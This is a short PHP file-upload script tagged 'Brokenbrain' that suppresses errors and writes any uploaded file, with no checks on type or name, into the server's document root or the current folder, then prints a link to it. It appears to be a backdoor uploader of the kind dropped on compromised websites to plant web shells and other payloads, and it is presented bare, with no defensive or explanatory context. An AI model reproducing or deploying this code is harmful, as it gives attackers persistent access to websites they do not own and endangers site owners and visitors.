<?php
error_reporting(0); /* Brokenbrain */
echo "<form method='post' enctype='multipart/form-data'>

<input type='file' name='priv_file'>

<input type='submit' name='upload' value='submit'>
</form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['priv_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
if(is_writable($root)) {
if(@copy($_FILES['priv_file']['tmp_name'], $dest)) {
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "success => <a href='$web$files' target='_blank'>$web$files</a>";
} else {
echo "FAILED TO UPLOAD IN DOCUMENT ROOT";
}
} else {
if(@copy($_FILES['priv_file']['tmp_name'], $files)) {
echo "success upload $files in this folder";
} else {
echo "Failed";
}
}
}
?>